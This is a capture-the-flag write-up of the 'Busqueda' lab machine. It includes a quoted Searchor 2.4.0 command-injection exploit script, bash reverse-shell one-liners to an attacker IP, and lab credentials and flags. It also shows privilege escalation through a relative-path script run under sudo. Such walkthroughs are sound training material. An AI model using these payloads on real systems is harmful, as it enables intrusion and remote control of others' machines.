## Intro


Tags: #linux #WebApp #git #codereview #OSCPpath #easy
 
-----
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.228.217 busqueda.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n busqueda.htb
```

```shell
tarting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 13:05 -0400
Nmap scan report for busqueda.htb (10.129.228.217)
Host is up (0.058s latency).
Not shown: 65469 closed tcp ports (reset), 64 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A busqueda.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 13:06 -0400
Nmap scan report for busqueda.htb (10.129.228.217)
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52                                              
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   46.08 ms 10.10.14.1
2   47.17 ms busqueda.htb (10.129.228.217)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds
```
add this website on hosts too
```shell
echo '10.129.228.217 searcher.htb busqueda.htb' | sudo tee -a /etc/hosts
```

-----
# Foothold

## Vulnerable webapp version

on the bottom of the page i see the version
`Powered by Flask and Searchor 2.4.0` 

[https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh)
```shell
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
```
run the exploit
```shell
└─$ ./busqueda.sh http://searcher.htb 10.10.14.148
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is http://searcher.htb
[*] Input attacker is 10.10.14.148:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

## Shell as svc

grabbed user flag
```shell
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.228.217] 48846
bash: cannot set terminal process group (1465): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
svc@busqueda:~$ cat user.txt
cat user.txt
4ac071682c90b1cbdce1c696337901d5
```

### user enumeration
```shell
svc@busqueda:/$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash
```

### listening ports

```shell
svc@busqueda:/$ ss -tuln
ss -tuln
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:222        0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:39573      0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      511                *:80               *:*          
tcp   LISTEN 0      128             [::]:22            [::]:* 
```
lets see if we can find more info here
```shell
curl http://localhost:5000
```
nothing, lets try this one too:
```shell
curl http://localhost:3000
```
found this inside`<meta property="og:url" content="http://gitea.searcher.htb/">` a subdomain! lets explore it

add it to hosts too first
```shell
echo '10.129.228.217 gitea.searcher.htb searcher.htb busqueda.htb' | sudo tee -a /etc/hosts
```

### Filesystem enum

```shell
svc@busqueda:/var/www/app$ ls -la
ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jul  6 17:04 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

```shell
svc@busqueda:/var/www/app/.git$ ls
ls
branches
COMMIT_EDITMSG
config
description
HEAD
hooks
index
info
logs
objects
refs
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
#### creds obtained 

```shell
cody
jh1usoih2bkjaspwe92
```
could not login to ssh, lets try logging in to gitea

## Shell as svc on searcher via pass reuse

i couldnt login as cody on this host, but i could login as svc with cody's pass

```shell
└─$ ssh cody@searcher.htb                                                      
The authenticity of host 'searcher.htb (10.129.228.217)' can't be established.
ED25519 key fingerprint is: SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:17: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'searcher.htb' (ED25519) to the list of known hosts.
cody@searcher.htb's password: 
Permission denied, please try again.
cody@searcher.htb's password: 
```

```shell
└─$ ssh svc@searcher.htb                                                              
svc@searcher.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul  6 05:50:27 PM UTC 2026

  System load:                      0.34326171875
  Usage of /:                       80.2% of 8.26GB
  Memory usage:                     50%
  Swap usage:                       0%
  Processes:                        236
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.217
  IPv6 address for eth0:            dead:beef::a0de:adff:fe0f:951c


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$ ls
user.txt

```

---
# Privesc

## sudo -l

```shell
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### Custom script
```shell
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py sth
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
lets run `full-checkup`
```shell
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1465     │ 50m    │ 0    │ online    │ 0%       │ 30.4mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 50 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 50 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect f84a6b33fb5a
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect mysql_db
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

```
lets use the script to print leak sensitive data using `docker-inspect` option
```shell
svc@busqueda: sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea  
  
--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```
#### creds obtained

```shell
administrator
yuiu1hoiu4i5ho1uh
```

## gitea as administrator

![](MediaFiles/Pasted%20image%2020260706210837.png)
from here we can view the source code of those scripts
### codereview

`/opt/scripts/system-checkup.py`
```shell
#!/bin/bash

/usr/bin/echo '[=] Docker conteainers'

/usr/bin/docker ps -s -q|/usr/bin/xargs -I {} /usr/bin/docker inspect --format='{ {{json .Name}} : {{json .State.Status}} }' {}|/usr/bin/jq
/usr/bin/echo ''

/usr/bin/echo '[=] Docker port mappings'

/usr/bin/docker inspect gitea --format='{{json .NetworkSettings.Ports}}'|/usr/bin/jq
/usr/bin/echo ''
#!/bin/bash

/usr/bin/echo '[=] Apache webhosts'
/usr/bin/wget http://searcher.htb/ -T 3 -O /dev/null -q
if [[ $? -eq "0" ]]; then
	/usr/bin/echo '[+] searcher.htb is up'
else
	/usr/bin/echo '[-] searcher.htb is down'
fi

/usr/bin/wget http://gitea.searcher.htb/ -T 3 -O /dev/null -q
if [[ $? -eq "0" ]]; then
        /usr/bin/echo '[+] gitea.searcher.htb is up'
else
        /usr/bin/echo '[-] gitea.searcher.htb is down'
fi
/usr/bin/echo ''

/usr/bin/echo '[=] PM2 processes'
/usr/local/bin/pm2 list
```
#### Vulnerability

this is the important part:
```shell
elif action == 'full-checkup':  
try:  
arg_list = ['./full-checkup.sh']  
print(run_command(arg_list))  
print('[+] Done!')
```

Because this doesn’t contain the full path for full-checkup.sh, we may be able to create our own malicious file called full-checkup.sh, and execute it using our sudo permissions.

### Exploitation

place this inside a bash script named `full-checkup.sh`
```shell
#! /bin/bash  
bash -i >& /dev/tcp/10.10.14.148/4444 0>&1
```

```shell
svc@busqueda:~$ nano full-checkup.sh
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

## Shell as root
```shell
└─$ nc -lvnp 4444                                                                               
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.228.217] 48152
root@busqueda:/home/svc# whoami
whoami
root
root@busqueda:~# cat root.txt
cat root.txt
733dfc9c8de7e454ceb23ce847bb732
```

-----
# Summary



----
# Sidenotes